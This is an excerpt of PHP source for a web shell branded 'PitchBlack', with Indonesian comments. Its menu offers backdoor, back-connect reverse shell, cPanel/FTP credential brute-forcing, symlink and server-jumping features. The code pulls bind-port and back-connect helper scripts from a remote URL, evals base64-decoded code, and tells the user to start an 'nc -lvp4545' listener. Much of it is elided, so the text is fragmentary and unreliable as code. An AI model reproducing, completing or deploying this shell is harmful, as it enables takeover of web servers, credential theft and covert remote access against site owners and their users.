...
input,select,option { font:8pt tahoma;color:white;margin:2;border:1px solid gray; }
textarea { color:white;font:verdana bold;border:1px solid gray;margin:2; }
...
#pagebar a:visited { color:#700000; }
...
.barheader,.mainpanel table,td { border:1px solid #0F0F70; }
...
';
$host_allow = array("*"); 
$accessdeniedmess = "<body bgcolor=orange><a href=\"$sh_mainurl\"><font color=red>".$sh_name."</font></a>: <font color=red>access denied</font></body>";
$gzipencode = TRUE;
$filestealth = TRUE; 
$curdir = "./";
$tmpdir = ""; 
...
$quicklaunch1 = array(
			array('<font color=#FFFFFF>Home</font>',$surl),
			array("<font color=#FFFFFF>Backdoor</font>",$surl."x=sleep"),
			array("<font color=#FFFFFF>BackConnect</font>",$surl."x=konak"),
			array("<font color=#FFFFFF>cPanel</font>",$surl."x=cP"),
			array("<font color=#FFFFFF>MySQL</font>",$surl."x=sql&d=%d"),
			array("<font color=#FFFFFF>Jumping</font>",$surl."x=jump"),
			array("<font color=#FFFFFF>PHP-Info</font>",$surl."x=security&d=%d"),    
			array("<font color=#FFFFFF>Processes</font>",$surl."x=processes&d=%d"),
			array("<font color=#FFFFFF>Scan</font>",$surl."x=sken"),
			array("<font color=#FFFFFF>Joomla Index</font>",$surl."x=joomla"),
		    array("<font fcolor=#FFFFFF>Symlink</font>",$surl."x=sym&x=sym")
...
if ($x != "img") {
  ...
  if (!function_exists("cagetsource")) {
    function cagetsource($fn) {
      global $bangsat_sourcesurl;
      $array = array(
        "bangsat_bindport.pl" => "bangsat_bindport_pl.txt",
        "bangsat_bindport.c" => "bangsat_bindport_c.txt",
        "bangsat_backconn.pl" => "bangsat_backconn_pl.txt",
        "bangsat_backconn.c" => "bangsat_backconn_c.txt",
        "bangsat_datapipe.pl" => "bangsat_datapipe_pl.txt",
        "bangsat_datapipe.c" => "bangsat_datapipe_c.txt",
      );
      $name = $array[$fn];
      if ($name) {return file_get_contents($bangsat_sourcesurl.$name);}
      else {return FALSE;}
    }
  }
  ...
  if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
    $safemode = TRUE;
    $hsafemode = "<font color=#ff0039><b>SAFE MODE is [ON] </b></font>";
  }
  else {
    $safemode = FALSE;
    $hsafemode = "<font color=#17ff00><b>SAFE MODE is [OFF] </b></font>";
  }
...
echo $html_start;
echo "<div class=barheader2><h3><font color=yellow>PitchBlack</h3><font color=red>irc.pitchblack.us </font></div><hr color=black>\n";
...
if ($x == "phpinfo") {@ob_clean(); phpinfo(); bangsatexit();}
if ($x == "security") {
...
if ($x == "joomla") {
$almooj = base64_decode("");
eval ($almooj);
}
    ...
    if ($vd == "f") {
      ...
      foreach ($objects as $a) {
        ...
        foreach ($regxp_highlight as $r) {
          if (ereg($r[0],$o)) {
            if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; bangsatexit();}
            else {
              $r[1] = round($r[1]);
              $isdir = is_dir($v);
...
if ($x == "konak") {
  ...
  echo("<center><b>[&#8224;] ./backconnect [&#8224;]</b></br></br><form name=form method=POST>Host:<input type=text name=backconnectip size=15 value=$ip> Port: <input type=text name=backconnectport size=15 value=4545> Use: <select size=1 name=use><option value=Perl>PL</option></select> <input type=submit name=submit value=Connect></form>kalian run dulu di console atau server kalian <b>nc -lvp4545</b>, dan masukna ip sama portnya pada kedua kolom di atas. <b>baru kalian klik connectnya</b>'<br><br></center>");
  echo("$msg");
  echo("$emsg");
...
if ($x == "cP"){
	...
	function ftp_check($login,$pass) {
		 ...
		 if ($ftp) {
			...
			if ($res) {
			   echo '[ Sukses Bos ] '.$login.':'.$pass."  W00t\n";
			}
			else ftp_quit($ftp);
		 }
	}
	...
	echo '<center>cPanel Scan<br><a href="'.$surl.'x=cP&go=go">OK</a> || <a href="'.$surl.'">CANCEL</a></center>';
}

if ($x == "sleep"){
  $msg = $_POST['backcconnmsg'];
  $emsg = $_POST['backcconnmsge'];
  echo("<center><b>[&#8224;] ./backdoor [&#8224;]</b><br><br><form name=form method=POST>
...
echo "</td></tr></table>\n";
?>
<div  class=barheader2><b><font color=white>&#8226; <font color=red> Command Panel <font color=white>&#8226;</b></div>
...
<div class=barheader2 colspan=2><font color=white>[&#8226;] <font color=red>#scan <font color=red> @ <font color=yellow>irc.pitchblack.us</a>  <font color=white>[&#8226;]</font></div>
</body></html>